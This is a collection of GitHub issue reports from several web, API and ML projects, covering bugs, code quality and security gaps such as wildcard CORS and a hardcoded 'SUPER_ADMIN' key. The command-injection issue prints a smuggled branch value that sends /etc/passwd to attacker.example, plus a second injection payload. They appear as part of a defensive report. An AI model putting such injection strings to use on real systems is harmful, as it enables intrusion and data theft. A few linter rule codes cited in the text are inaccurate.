[BUG] ui-fix.css loaded twice in index.html causing redundant style parsing
issues.body:
## 🐞 Description

`ui-fix.css` is linked **twice** in the `<head>` of `index.html` — once at line 78 and again at line 85. The browser processes both `<link>` tags and builds the CSSOM from the stylesheet twice, adding unnecessary parse overhead and creating a subtle maintenance hazard.

---

## 🔁 Steps to Reproduce

1. Open `index.html`
2. Search for `ui-fix.css`
3. Observe two identical `<link>` tags:

```html
<!-- Line 78 -->
<link rel="stylesheet" href="ui-fix.css" />

<!-- Line 85 -->
<link rel="stylesheet" href="ui-fix.css" />
```

---

## 💻 Expected Behavior

`ui-fix.css` should appear exactly once in `<head>`.

---

## 🧠 Actual Behavior

The stylesheet is declared twice. While modern browsers deduplicate the network request via cache, both `<link>` tags are still parsed into the CSSOM independently. If the two entries ever diverge (e.g., one gets a `media` attribute or cache-busting query string added), styles could break silently. It also signals a copy-paste error to contributors reading the file.

---

## 🖼️ Screenshots / Logs (if applicable)

Browser DevTools → Network tab: `ui-fix.css` appears as a single network request (cached), but both `<link>` nodes are visible in the Elements panel.

---

## 🧩 Environment

- File: `index.html`, lines 78 and 85
- OS: Any
- Browser: Any

---

## ✅ Checklist

- [x] I have searched for existing issues before creating this one.
- [x] I have included all relevant details and reproduction steps.

---

## 🔧 Suggested Fix

Remove the duplicate `<link>` tag at line 85, keeping only the one at line 78:

```html
<!-- Keep this -->
<link rel="stylesheet" href="ui-fix.css" />

<!-- Remove this duplicate -->
<!-- <link rel="stylesheet" href="ui-fix.css" /> -->
```

issues.title: [SECURITY] CORS middleware uses allow_methods=["*"] — exposes DELETE, TRACE and all HTTP verbs unnecessarily
issues.body:
## 🐞 Description

The FastAPI backend's CORS middleware is configured with `allow_methods=["*"]`, which permits **every HTTP method** — including `DELETE`, `PUT`, `PATCH`, `TRACE`, and `OPTIONS` — from cross-origin clients. The actual API only uses `GET` and `POST`. This unnecessarily widens the attack surface.

Critically, `allow_credentials=True` is also set alongside the wildcard. The OWASP CORS guide explicitly warns that combining credentialed requests with overly permissive method lists is dangerous: a CSRF gap or future endpoint added without careful review could allow credentialed `DELETE` or `PUT` requests from a third-party origin.

Additionally, `TRACE` being allowed enables **Cross-Site Tracing (XST)** attacks, where an attacker can read `HttpOnly` cookies via JavaScript in some older browser configurations.

---

## 🔁 Steps to Reproduce

1. Open `backend/app/main.py`
2. Review lines 17–25:

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://127.0.0.1:5500", "http://localhost:5500",
                   "https://cara-janavipandoles-projects.vercel.app"],
    allow_credentials=True,
    allow_methods=["*"],   # ← all methods permitted
    allow_headers=["*"],
)
```

3. Send a cross-origin `OPTIONS` preflight for `DELETE /api/auth/...` — the server responds with `Access-Control-Allow-Methods: *`

---

## 💻 Expected Behavior

Only the HTTP methods actually used by the API (`GET`, `POST`) should be listed in `allow_methods`. All others should be rejected at the CORS preflight stage.

---

## 🧠 Actual Behavior

A cross-origin client can make credentialed `DELETE`, `PUT`, `PATCH`, and `TRACE` requests and receive a permissive CORS response.

---

## 🖼️ Screenshots / Logs (if applicable)

N/A — verifiable via `curl` or browser DevTools Network tab (inspect `Access-Control-Allow-Methods` response header on preflight).

---

## 🧩 Environment

- File: `backend/app/main.py`, line 23
- Framework: FastAPI with `starlette.middleware.cors.CORSMiddleware`

---

## ✅ Checklist

- [x] I have searched for existing issues before creating this one.
- [x] I have included all relevant details and reproduction steps.

---

## 🔧 Suggested Fix

Replace the wildcard with an explicit allowlist matching actual API usage:

```python
allow_methods=["GET", "POST"],
```

If the recommendations or product endpoints ever need `PUT`/`PATCH`, add them explicitly at that point rather than using a wildcard.

issues.title: [BUG] Camera stream not stopped when navigating away from try-on page — camera indicator stays on
issues.body:
## 🐞 Description

When a user starts the webcam on the virtual try-on page and then navigates away (clicks a nav link, presses the browser back button, or closes the tab) without pressing the on-screen \"Stop Camera\" button, the camera stream is never released. The browser camera indicator light stays on, the `MediaStream` tracks remain active, and any running `requestAnimationFrame` loop continues consuming GPU/CPU in the background.

---

## 🔁 Steps to Reproduce

1. Open `try-on.html`
2. Click **Open Camera** — grant camera permission
3. Without clicking **Stop Camera**, click any navigation link (e.g., Shop, Home)
4. Observe: the browser camera indicator (red dot / green light) remains active

---

## 💻 Expected Behavior

When the user leaves the try-on page, the camera stream should be stopped automatically and all `MediaStreamTrack` instances should be released.

---

## 🧠 Actual Behavior

`cameraStream` is declared at module scope in `try-on.js` (line 27) and is only stopped by the manual stop button handler (lines 196–198). There is no `pagehide`, `beforeunload`, or `visibilitychange` listener to clean up the stream on navigation.

```js
// try-on.js:27
let cameraStream = null;

// Cleanup only happens inside stopCamera() — never called on navigation
cameraStream.getTracks().forEach(t => t.stop());
```

---

## 🖼️ Screenshots / Logs (if applicable)

N/A — reproducible by following the steps above. The browser tab icon will show the camera-in-use indicator.

---

## 🧩 Environment

- OS: Any
- Browser: Chrome / Firefox / Safari (all implement MediaStream)
- Affects: `try-on.html` + `try-on.js`

---

## ✅ Checklist

- [x] I have searched for existing issues before creating this one.
- [x] I have included all relevant details and reproduction steps.

---

## 🔧 Suggested Fix

Add a `pagehide` event listener (preferred over `beforeunload` for back/forward cache compatibility) that calls the existing `stopCamera()` logic:

```js
window.addEventListener('pagehide', () => {
  if (cameraStream) {
    cameraStream.getTracks().forEach(t => t.stop());
    cameraStream = null;
  }
});
```

This reuses the existing cleanup logic and requires no refactoring.

issues.title: [Bug] harvestDate future-date validation missing from Zod schema — invalid dates return 500 instead of 400

labels.name: level:intermediate
labels.description: 35 pts for contributor 20 pts for mentor

issues.body:
## Bug Description

The business rule "harvest date cannot be in the future" is enforced only in a Mongoose pre-save hook (`backend/models/Batch.js:262`), but is absent from the Zod request validation schema that runs at the API boundary (`backend/validations/batchSchema.js`).

```js
// backend/models/Batch.js — lines 262–265 (Mongoose pre-save hook)
if (new Date(this.harvestDate) > new Date()) {
  throw new Error('Harvest date cannot be in the future');
}
```

The Zod `createBatchSchema` only validates that the field is a valid datetime string — it does not check whether the date is in the past:

```js
// backend/validations/batchSchema.js (current behaviour)
harvestDate: z.string().datetime()  // ← no .refine() for past-date check
```

## Environment / Wallet

Node.js backend · Express 4 · Zod validation · `backend/validations/batchSchema.js` · `backend/models/Batch.js` · `backend/middleware/validator.js`

## Steps to Reproduce

1. Authenticate as a farmer
2. POST to `/api/batches` with a `harvestDate` set to a future date (e.g., `"2099-01-01T00:00:00.000Z"`)
3. Observe that the request passes Zod validation successfully
4. The error surfaces deep in the Mongoose layer and is returned as a **500 Internal Server Error** instead of a descriptive **400 Bad Request**

```shell
# Actual response
HTTP 500
{ "error": "Server error", "code": "SERVER_ERROR" }

# Expected response
HTTP 400
{ "error": "Harvest date cannot be in the future", "code": "INVALID_HARVEST_DATE" }
```

## Relevant Logs/Error Messages

```shell
Error: Harvest date cannot be in the future
    at /backend/models/Batch.js:263
    # Stack bubbles up through Mongoose, caught by global error handler as 500
```

## Why This Matters

- **Wrong HTTP status code:** A client-caused error (invalid input) must return 4xx, not 5xx. Returning 500 misleads monitoring/alerting tools into thinking the server itself failed.
- **No machine-readable error code:** Frontend form validation cannot show an accurate inline error without a structured `INVALID_HARVEST_DATE` code.
- **Validation belongs at the boundary:** Mongoose hooks are the last line of defence. Business rules should be caught at the schema/middleware layer before any DB operation is attempted.
- **Admin script bypass:** Direct MongoDB updates via admin scripts or migrations bypass Mongoose hooks entirely, meaning the validation is silently skipped.

## Proposed Fix

Add a `.refine()` check to the Zod schema:

```ts
// backend/validations/batchSchema.js
harvestDate: z.string().datetime().refine(
  (date) => new Date(date) <= new Date(),
  { message: 'Harvest date cannot be in the future' }
),
```

This ensures the validation runs at the HTTP boundary, produces a structured 400 response with a clear message, and is applied consistently regardless of how the model is persisted. The Mongoose hook can remain as a secondary safeguard.

[Bug]: Unvalidated branch parameter enables shell command injection in E2B sandbox
issues.body:
## Summary

The `branch` parameter supplied by the user when triggering a deployment is interpolated directly into a shell command string without any format validation. This allows an attacker to inject arbitrary shell commands that execute inside the E2B sandbox.

## What I Expected

The `branch` value should be validated against a strict allowlist (e.g. alphanumerics, hyphens, dots, underscores) before being embedded in a shell command.

## What Happened Instead

In `lib/deployer.ts` (line 238), the branch name is concatenated directly into the git clone command:

```typescript
const cloneResult = await sandbox.commands.run(
  `git clone --depth 1 --branch ${branch} ${repoUrl} /home/user/repo 2>&1`,
  { timeoutMs: 120_000 }
);
```

The `branch` value originates from the deploy API request body (`options?.branch`), which is user-controlled. A crafted branch name such as:

```
main; curl https://attacker.example/exfil?data=$(cat /etc/passwd)
```

would cause the sandbox to execute the injected command after the git clone.

## Steps to Reproduce

1. Authenticate and call the deploy API with a malicious branch value:
   ```json
   {
     "repoUrl": "https://github.com/user/repo",
     "branch": "main; id > /tmp/pwned"
   }
   ```
2. Observe the injected command executes inside the sandbox.

## Environment

- Affected file: `lib/deployer.ts`, line 238
- Entry point: any API route that calls `deployRepo(repoUrl, options)` with user-supplied `options.branch`

## Logs or Screenshots

N/A

## Additional Context

**Suggested fix** — add branch name validation before the clone step:

```typescript
const SAFE_BRANCH_RE = /^[a-zA-Z0-9_\\-/.]+$/;

if (!SAFE_BRANCH_RE.test(branch)) {
  throw new Error(`Invalid branch name: ${branch}`);
}
```

This regex covers all valid git branch name characters while blocking shell metacharacters. The check should be added in `deployRepo` immediately after the branch value is resolved (line 122), before the sandbox is created.

[Bug]: lib/crypto.ts contains two conflicting encryption implementations using different keys
issues.body:
## Summary

`lib/crypto.ts` currently contains two complete, independent AES-256-GCM encryption implementations concatenated in the same file. They use different keys and are both exported, creating a silent correctness hazard where data encrypted with one function cannot be decrypted by the other.

## What I Expected

A single, canonical encryption/decryption API that the rest of the codebase uses consistently.

## What Happened Instead

The file currently exports **four** encryption functions across two distinct implementations:

**Implementation 1 (lines 1–87)** — keyed from `process.env.ENCRYPTION_KEY`:
```typescript
export function encryptSecret(cleartext: string): string { ... }
export function decryptSecret(encryptedPayload: string): string { ... }
```

**Implementation 2 (lines 88–116)** — keyed from `process.env.NEXTAUTH_SECRET` (SHA-256 hashed):
```typescript
export function encrypt(plaintext: string): string { ... }
export function decrypt(ciphertext: string): string { ... }
```

Both produce the same ciphertext format (`iv:authTag:encryptedData`) but use completely different key material. If any part of the codebase calls `encryptSecret` to store data and later calls `decrypt` to read it back (or vice versa), decryption will silently throw an auth-tag mismatch error.

## Steps to Reproduce

1. Open `lib/crypto.ts`.
2. Observe the second `import` statement at line 88 — a new set of imports begins mid-file, which is a strong signal of an accidental merge or paste.
3. Attempt to round-trip data across the two implementations:
   ```typescript
   const ciphertext = encryptSecret("hello");
   decrypt(ciphertext); // throws: auth tag mismatch
   ```

## Environment

- Affected file: `lib/crypto.ts` (entire file)
- Related: `lib/env-store.ts` (calls `encryptSecret`/`decryptSecret`)

## Logs or Screenshots

```
Error: Unsupported state or unable to authenticate data
    at Decipheriv.final (node:internal/crypto/cipher.js:...)
```

## Additional Context

**Suggested fix:**

1. Decide on one canonical implementation. The `encryptSecret`/`decryptSecret` pair (lines 1–87) uses the dedicated `ENCRYPTION_KEY` env var, which is the correct approach for secrets management.
2. Remove lines 88–116 entirely (the second `import` block and `encrypt`/`decrypt` functions).
3. Update any callers of `encrypt`/`decrypt` to use `encryptSecret`/`decryptSecret` instead.
4. Add a test that round-trips data through the canonical functions to prevent regression.

issues.title: [Security] /api/recommend route mounted without rate limiter — AI endpoint open to cost abuse

labels.name: level:critical
labels.description: 80 pts for contributors 50 pts for mentors

issues.body:
## Bug Description

The `/api/recommend` route is mounted in `backend/server.js` without any rate limiter middleware, while every other route group has an explicit limiter applied:

```js
// server.js
app.use('/api/auth',      authLimiter,    authRoutes);     // ✅ 5 req / 15 min
app.use('/api/approvals', batchLimiter,   approvalRoutes); // ✅ 20 req / 15 min
app.use('/api/batches',   batchLimiter,   ...);            // ✅ 20 req / 15 min
app.use('/api/recommend', recommendRoutes);                // ❌ NO limiter — line 306
```

The recommendation service (`backend/services/aiService.js`) calls Google Gemini or OpenAI. These calls are billed per token. Any authenticated user is currently limited only by the general limiter (100 req / 15 min globally), meaning they can make up to 100 AI inference calls every 15 minutes with no specific throttle on the AI endpoint.

## Environment / Wallet

Node.js backend · Express 4 · `backend/middleware/rateLimiters.js` · `backend/services/aiService.js` · `backend/routes/recommendRoutes.js`

## Steps to Reproduce

1. Authenticate as any valid user
2. Send repeated POST requests to `/api/recommend` in a loop
3. Observe that requests succeed up to the general limit (100 / 15 min) with no AI-specific throttling
4. Each request triggers a Gemini / OpenAI API call, incurring token costs

## Relevant Logs/Error Messages

No error — requests succeed silently. Cost impact is only visible in the AI provider billing dashboard.

## Why This Matters

- **Direct financial impact:** AI API calls are billed per token. At scale, unthrottled access causes runaway costs with no circuit-breaker.
- **Service degradation:** A single abusive user can consume the AI quota allocated for all users.
- **Inconsistency:** Every other expensive or sensitive route has a dedicated limiter. The omission of one on `/api/recommend` appears to be an oversight rather than intentional design.

## Proposed Fix

Add a dedicated limiter in `backend/middleware/rateLimiters.js`:

```js
const aiLimiter = createLimiter(
  parseInt(process.env.AI_RATE_LIMIT_MAX, 10) || 10,
  'Too many AI requests from this IP, please try again later.'
);

module.exports = { generalLimiter, authLimiter, batchLimiter, aiLimiter };
```

Then apply it in `server.js`:

```js
const { generalLimiter, authLimiter, batchLimiter, aiLimiter } = require('./middleware/rateLimiters');

app.use('/api/recommend', aiLimiter, recommendRoutes);
```

Also add `AI_RATE_LIMIT_MAX=10` to `backend/.env.example` with a descriptive comment.

[Code Quality] Replace console.log/error/warn with Winston logger in middleware/auth.js and server.js

labels.name: level:intermediate
labels.description: 35 pts for contributor 20 pts for mentor

issues.body:
## Bug Description

Issue #349 migrated controllers to Winston, but `middleware/auth.js` and `server.js` were not included in scope. Both files continue to use raw `console.log` / `console.error` / `console.warn` for security-critical events — including RBAC violations, auth failures, and permission denials — while the rest of the codebase now uses the structured Winston logger.

This is a direct continuation of the work done in #349.

**Affected files and specific lines:**

`backend/middleware/auth.js`:
- Line 113: `console.log(`[AUTH FAIL] User ${userId} (${req.user.role}) attempted unauthorized...`)`
- Line 125: `console.error('Authorization error:', error)`
- Line 134: `console.log(`[RBAC VIOLATION] User ${req.user.email}...`)`
- Line 158: `console.log(`[STAGE VIOLATION] User ${req.user.email}...`)`
- Line 169: `console.log(`[BLOCKCHAIN VIOLATION]...`)`
- Line 180: `console.log(`[PERMISSION DENIED]...`)`
- Line 247: `console.error('Safety status check error:', error)`

`backend/server.js`:
- Line 179: `console.warn(`[CORS BLOCKED] Origin: ${origin}`)`
- Line 208: `console.error('Blockchain configuration error:', error.message)`
- Line 286: `console.log('✓ Blockchain contract instance initialized')`
- Line 322: `console.log(`[SUCCESS] Batch created: ${result.batch.batchId}...`)`
- 60+ additional occurrences throughout the file

## Environment / Wallet

Node.js backend · Express 4 · Winston already configured at `backend/utils/logger.js`

## Steps to Reproduce

1. Trigger an RBAC violation (e.g., send a request from a role without permission)
2. Check structured log output (e.g., piped to a log aggregation tool)
3. Observe that the RBAC violation events appear as unstructured plain-text on stdout instead of as structured Winston JSON entries

## Relevant Logs/Error Messages

```shell
# Current output (console.log):
[RBAC VIOLATION] User farmer@example.com (farmer) attempted to access endpoint requiring roles: admin

# Expected output (Winston):
{"level":"warn","message":"RBAC violation","email":"farmer@example.com","role":"farmer","requiredRoles":["admin"],"timestamp":"2026-06-13T10:00:00.000Z"}
```

## Why This Matters

Security audit events are the most critical logs to route to a structured, persistent store. Raw `console.log` output:
- Cannot be filtered by log level in aggregation tools (Datadog, CloudWatch, Loki)
- Leaks email addresses and role names to unstructured stdout with no control over destination in containerised environments
- Breaks any log-based alerting on security events

The Winston logger is already configured and imported in controllers — this is a straightforward extension of the same pattern.

## Proposed Fix

```js
// At top of middleware/auth.js
const logger = require('../utils/logger');

// Replace all console.log/error/warn with:
logger.warn('RBAC violation', { email: req.user.email, role: req.user.role, requiredRoles: roles });
logger.error('Authorization error', { error: error.message });
```

Apply the same substitution throughout `server.js`, choosing the appropriate log level (`info`, `warn`, `error`) based on severity.

issues.title: [Bug] NotificationBell infinite shake animation bypasses prefers-reduced-motion, violating WCAG 2.3.3

labels.name: GSSoC'26
labels.description: Automatically applied to issues for GSSoC'26

labels.name: priority:medium
labels.description: Medium priority — should be addressed soon

labels.name: needs-labels
labels.description: Issue is missing required label categories

labels.name: assigned
labels.description: Issue is assigned to a contributor

labels.name: website
labels.description: Issues/PRs related to the main NexaSphere website

issues.body:
### Description

`website/src/components/NotificationBell.jsx` (lines 84–87) applies a Framer Motion rotation animation that repeats indefinitely whenever there are unread notifications:

```jsx
<motion.div
  animate={unreadCount > 0 ? { rotate: [0, -15, 15, -10, 10, 0] } : {}}
  transition={{ duration: 0.5, repeat: Infinity, repeatDelay: 4 }}
>
```

The project correctly disables CSS-based animations via `@media (prefers-reduced-motion: reduce)` in `website/src/styles/motion.css`, but this Framer Motion animation is driven entirely by JavaScript. CSS media queries have **no effect** on JS-driven inline style animations — they are applied directly to the DOM as `transform` style properties, completely bypassing any CSS rules.

Because there is no `useReducedMotion()` hook from Framer Motion used in this component, the bell shakes indefinitely (every 4.5 seconds) regardless of the user's OS-level "Reduce Motion" accessibility setting.

This violates **WCAG 2.3.3 (Animation from Interactions)** and can cause physical discomfort or nausea for users with vestibular disorders. The notification bell is one of the most persistently visible UI elements across the entire application.

### Steps to Reproduce

1. Enable "Reduce Motion" in your OS accessibility settings (macOS: System Settings → Accessibility → Display → Reduce Motion; Windows: Settings → Accessibility → Visual Effects → Animation Effects off).
2. Open NexaSphere with at least one unread notification.
3. Observe that the notification bell continues to shake every 4.5 seconds, ignoring the OS preference.

### Expected Behavior

When the user has enabled `prefers-reduced-motion`, the bell should display statically (no rotation animation) or use a minimal, non-vestibular alternative such as a subtle opacity pulse.

### Suggested Fix

Use Framer Motion's `useReducedMotion` hook to conditionally disable the animation:

```jsx
import { motion, useReducedMotion } from 'framer-motion';

// Inside the component:
const shouldReduceMotion = useReducedMotion();

<motion.div
  animate={unreadCount > 0 && !shouldReduceMotion ? { rotate: [0, -15, 15, -10, 10, 0] } : {}}
  transition={{ duration: 0.5, repeat: Infinity, repeatDelay: 4 }}
>
```

This is consistent with how the rest of the codebase handles reduced-motion via CSS, and `useReducedMotion` is already available as part of the Framer Motion dependency that is already installed.

### Environment

- **File:** `website/src/components/NotificationBell.jsx`, lines 84–87
- Framework: React (Vite) + Framer Motion
- Reproducible on macOS, Windows, and any OS with a "Reduce Motion" accessibility setting
- Affects all browsers (Chrome, Firefox, Safari, Edge)

issues.body:
### Description

`website/src/pages/events/EventDetailPage.jsx` (line 498) determines whether to show the registration form using only `status` and `capacity`:

```js
const isUpcoming = event.status === 'upcoming';
const canRegister = isUpcoming && event.capacity > 0;
```

There is no check against the actual event date. If `event.status` is stale (not auto-updated when the event start time passes), `canRegister` remains `true` and the registration form stays visible and submittable for events that have already started or ended.

On the server side, `server/services/capacityLockingService.js` calls the Supabase RPC `register_for_event`, which enforces capacity and duplicate-email constraints but performs no date comparison. This means a POST to `/api/content/events/:id/register` can succeed for a past event as long as capacity has not been reached and the email is unique.

The result is:

- Users receive confirmation emails and tickets for events they cannot attend.
- Organizers see inflated registration numbers for completed events.
- Attendance data becomes unreliable.

### Steps to Reproduce

1. Find (or temporarily set) an event whose `status` field is still `"upcoming"` but whose date has passed.
2. Open the event detail page — the registration form is visible.
3. Submit valid registration details.
4. The registration succeeds: a 200 response is returned and a confirmation email is sent.

### Expected Behavior

Registration should be blocked once the event date has passed, regardless of what the `status` field says. Both the client (to hide the form) and the server (to reject late requests) should enforce this.

### Suggested Fix

**Client (`EventDetailPage.jsx`):**
```js
const eventDate = event.date ? new Date(event.date) : null;
const isPast = eventDate && !isNaN(eventDate.getTime()) && eventDate < new Date();
const canRegister = isUpcoming && event.capacity > 0 && !isPast;
```

**Server (`eventRegistrationController.js` or `capacityLockingService.js`):**
Add a date pre-check before calling the RPC:
```js
const event = await eventsRepository.getById(eventId);
if (event.date && new Date(event.date) < new Date()) {
  return res.status(400).json({ error: 'Registration is closed — this event has already taken place.' });
}
```

### Environment

- **Files:**
  - `website/src/pages/events/EventDetailPage.jsx`, line 498
  - `server/controllers/eventRegistrationController.js`, lines 54–60
  - `server/services/capacityLockingService.js`, lines 5–41
- Framework: React (Vite) frontend + Express backend
- Affects all browsers

issues.title: [Task]: Bug: Module-level AdversarialDriftMonitor() instantiation in drift_monitor.py causes import-time side effects
issues.body:
## Short Descriptive Title

Module-level `AdversarialDriftMonitor()` instantiation in `src/mlops/drift_monitor.py` causes import-time side effects — spawning threads, generating random baselines, and reading environment variables before application startup

## Detailed Description

At the bottom of `src/mlops/drift_monitor.py`, there is a module-level instantiation:

```python
# src/mlops/drift_monitor.py:130
monitor = AdversarialDriftMonitor()
```

This means that **simply importing this module** triggers the following side effects unconditionally:

1. **Thread executor spawned** — `ThreadPoolExecutor(max_workers=4)` is created immediately at import time, consuming OS thread handles and memory before any monitoring is needed.
2. **Random baselines generated** — `_generate_baselines()` is called, producing randomized statistical baselines. These baselines are re-generated fresh on every process restart, defeating the purpose of persistent drift detection across deployments.
3. **Environment variable read at the wrong time** — `SLACK_WEBHOOK_URL` is read from the environment during import. If this variable is configured after the module is first imported (common in test fixtures that patch environment variables), the monitor starts with an empty or wrong URL and there is no way to reconfigure it without restarting the process.
4. **No cleanup path** — if the module is imported in subprocesses or multiple times in a test run, multiple executors are created with no coordinated cleanup, leading to thread leaks.

**Concrete impact on testing:**
Any test file that imports from `drift_monitor` — even indirectly via a transitive import — will trigger executor creation and baseline generation. This makes test isolation fragile: tests that patch `os.getenv` or set environment variables after import will silently use stale config from the module-level instantiation. This explains patterns where test fixtures that set `SLACK_WEBHOOK_URL` have no effect on the monitor's behavior.

**Affected file:** `src/mlops/drift_monitor.py:130`

## Proposed Solution / Implementation Plan

1. Remove the module-level `monitor = AdversarialDriftMonitor()` instantiation.
2. Replace with an explicit factory function or lazy initialization pattern so callers control when the monitor is created:

```python
# Option A: factory function
def create_monitor(**kwargs) -> AdversarialDriftMonitor:
    """Create and return a configured AdversarialDriftMonitor instance."""
    return AdversarialDriftMonitor(**kwargs)

# Option B: lazy singleton (only if a shared instance is genuinely needed)
_monitor: Optional[AdversarialDriftMonitor] = None

def get_monitor() -> AdversarialDriftMonitor:
    global _monitor
    if _monitor is None:
        _monitor = AdversarialDriftMonitor()
    return _monitor
```

3. Update all callers of the module-level `monitor` to use the factory or accessor instead.
4. Add a test verifying that `import drift_monitor` does **not** create any threads (use `threading.active_count()` before and after the import to assert no change).

issues.title: [Task]: Security: AdversarialDriftMonitor reads SLACK_WEBHOOK_URL directly, bypassing centralized HTTPS validation in WebhookConfig
issues.body:
## Short Descriptive Title

`AdversarialDriftMonitor` reads `SLACK_WEBHOOK_URL` directly from the environment, bypassing the centralized HTTPS scheme validation enforced by `WebhookConfig` in `src/config/schemas.py`

## Detailed Description

`src/config/schemas.py` has a `WebhookConfig` Pydantic validator that explicitly enforces HTTPS for all webhook URLs:

```python
# src/config/schemas.py:148-159
if v and not v.startswith("https://"):
    raise ValueError(
        "DISCORD_WEBHOOK_URL must be a full HTTPS URL ..."
    )
# same check for SLACK_WEBHOOK_URL at line ~159
```

This is a deliberate security guardrail — webhook payloads contain model telemetry and fraud alert details that must not be transmitted over plaintext HTTP.

However, `AdversarialDriftMonitor.__init__` bypasses this guardrail entirely by reading the environment variable directly:

```python
# src/mlops/drift_monitor.py:27
self.webhook_url = webhook_url or os.getenv("SLACK_WEBHOOK_URL")
```

This value is never passed through `WebhookConfig` or any URL scheme validation. If an operator sets `SLACK_WEBHOOK_URL=http://internal-collector.example.com/hook`, the validation in `schemas.py` never sees it, and `drift_monitor.py` will silently use the HTTP URL.

**What gets sent over plaintext HTTP when this happens:**
- Feature names that triggered drift alerts
- Statistical p-values and drift percentages
- Model deviation details
- Timestamps of anomaly events

**The inconsistency:** Any operator who trusts the `WebhookConfig` schema to enforce HTTPS across the application would not expect a core monitoring component to bypass it silently. There is no warning logged when an HTTP URL is used.

**Affected files:**
- `src/mlops/drift_monitor.py:27` — bypasses validation
- `src/config/schemas.py:148–159` — has the correct validation that is not reused

## Proposed Solution / Implementation Plan

Option A — Validate inline in `AdversarialDriftMonitor.__init__`:
```python
self.webhook_url = webhook_url or os.getenv("SLACK_WEBHOOK_URL")
if self.webhook_url and not self.webhook_url.startswith("https://"):
    raise ValueError(
        f"SLACK_WEBHOOK_URL must use HTTPS, got: {self.webhook_url!r}"
    )
```

Option B — Route `AdversarialDriftMonitor` through the centralized `AppConfig` so it inherits `WebhookConfig` validation automatically. This is the preferred long-term approach as it ensures a single source of truth for webhook URL validation across the entire application.

Either option should be accompanied by a unit test asserting that an `http://` webhook URL raises a `ValueError` at construction time.

issues.title: [Task]: Bug: Unreachable dead code — double break statement in RateLimiter._prune_expired()
issues.body:
## Short Descriptive Title

Unreachable dead code — double `break` statement in `RateLimiter._prune_expired()` in `src/api/validators.py`

## Detailed Description

Inside the `_prune_expired()` method of `RateLimiter`, there are two consecutive `break` statements in the same `else` block:

```python
# src/api/validators.py (inside _prune_expired)
else:
    break
    break  # remaining entries are even newer
```

The second `break` is **completely unreachable** — the first `break` unconditionally exits the loop before the second statement is ever evaluated. The inline comment was intended to explain the pruning logic but is attached to dead, never-executed code.

This is reproducible by running any static analysis tool:
- `flake8`: raises `E741` / unreachable code warning
- `pylint`: raises `W0101: statement unreachable`
- `pyflakes`: flags the dead statement

**Impact:**
- Misleads contributors into thinking there are two distinct exit conditions in the loop
- Indicates an incomplete edit — either the comment was meant for the first `break`, or a refactor left this stub behind
- CI linting pipelines that check for unreachable code will fail or warn on this file

**Affected file:** `src/api/validators.py`

## Proposed Solution / Implementation Plan

1. Remove the second `break` statement.
2. Move the clarifying comment to the first `break` so the intent is preserved:

```python
else:
    break  # remaining entries are even newer — nothing left to prune
```

3. Optionally run `python -m py_compile src/api/validators.py` and `flake8 src/api/validators.py` to confirm no other dead code exists in this file.

issues.title: [Task]: Security: Hardcoded plaintext "SUPER_ADMIN" comparison in governance_routes.py and decision_routes.py bypasses SHA-256 auth stack
issues.body:
## Short Descriptive Title

Hardcoded plaintext `"SUPER_ADMIN"` string comparison in `governance_routes.py` and `decision_routes.py` bypasses the proper SHA-256 hashed authentication stack in `security.py`

## Detailed Description

The codebase has a well-designed authentication system in `src/api/security.py` that implements:
- SHA-256 API key hashing via `AEGIS_API_KEY_HASHES` environment variable
- HMAC constant-time comparison (prevents timing attacks)
- JWT token validation
- Full RBAC role inheritance (`SUPER_ADMIN > ADMIN > ANALYST/AUDITOR > VIEWER`)
- Audit logging of all access attempts

However, both `governance_routes.py` and `decision_routes.py` define their **own** `verify_api_key` function that bypasses all of the above entirely:

```python
# src/api/governance_routes.py:70
def verify_api_key(x_api_key: str = Header(None)) -> str:
    """Verify API key."""
    if x_api_key != "SUPER_ADMIN":      # ← raw plaintext comparison, no hashing
        raise HTTPException(status_code=401, detail="Invalid API key")

# src/api/decision_routes.py:38  (identical pattern)
def verify_api_key(x_api_key: str = Header(None)) -> str:
    if x_api_key != "SUPER_ADMIN":
        raise HTTPException(status_code=401, detail="Invalid API key")
```

Any caller who reads the source code — or simply guesses this well-known placeholder string — can send `X-API-Key: SUPER_ADMIN` and gain unrestricted access to all AI governance and fraud decision endpoints, bypassing every layer of the auth stack.

**What is bypassed:**
- SHA-256 key hashing (the secret is compared in plaintext)
- Constant-time HMAC comparison (vulnerable to timing attacks)
- JWT validation (no token required at all)
- Role-based access control from `security.py`
- Audit logging — `AuditLogger` is never invoked for these routes

**These are the highest-privilege routes in the system** — AI governance decisions and fraud intelligence endpoints. The existing security infrastructure in `security.py` is correct; these two route files simply never use it.

**Affected files:**
- `src/api/governance_routes.py:70`
- `src/api/decision_routes.py:38`

## Proposed Solution / Implementation Plan

1. Remove the custom `verify_api_key` functions from both route files.
2. Replace with a `Depends()` on the shared RBAC authenticator from `security.py`:

```python
from src.api.security import require_role, Role

@router.get("/endpoint", dependencies=[Depends(require_role(Role.SUPER_ADMIN))])
async def my_endpoint():
    ...
```

3. Confirm that `AEGIS_API_KEY_HASHES` or `AEGIS_ROLE_SUPER_ADMIN` is documented in `.env.example` for operators.
4. Add a test asserting that a plaintext `X-API-Key: SUPER_ADMIN` header is **rejected** on these routes (i.e., only hashed keys are accepted).

issues.title: [Task]: Bug: Duplicate empty load_environment() stub in src/config/loaders.py silently loses first definition
issues.body:
## Short Descriptive Title

Duplicate empty `load_environment()` stub in `src/config/loaders.py` silently loses first definition

## Detailed Description

`src/config/loaders.py` defines `load_environment()` **twice**. The first definition (around line 92) has an **empty body** — no implementation, no `pass`, no `return`. The second definition immediately follows with the full implementation.

Python silently discards the first function object when the second `def` is executed, so at runtime the correct implementation runs — but only by accident. If the ordering is ever changed (e.g., during a merge conflict resolution), the function becomes a silent no-op and the entire environment config loading pipeline returns `None`.

```python
def load_environment(
    environ: Optional[Mapping[str, str]] = None,
) -> EnvironmentVariablesSchema:
    """Load recognized environment variables into a typed raw schema."""
    # ← empty body — no implementation here, immediately overwritten below

def load_environment(
    environ: Optional[Mapping[str, str]] = None,
) -> EnvironmentVariablesSchema:
    """Load recognized environment variables into a typed raw schema."""
    load_dotenv()
    ...  # actual implementation
```

Static analysis tools flag this as `F811: redefinition of unused 'load_environment'` (flake8) and `W0102` (pylint). Running `flake8 --select=F811 src/config/loaders.py` will reproduce it.

**Impact:**
- Dead code masquerading as valid code
- Fragile: any reordering causes silent config failure
- Confuses contributors reviewing the config loading logic
- Suggests a botched edit or leftover refactor stub

**Affected file:** `src/config/loaders.py`

## Proposed Solution / Implementation Plan

1. Delete the first (empty) `load_environment()` definition — keep only the complete implementation.
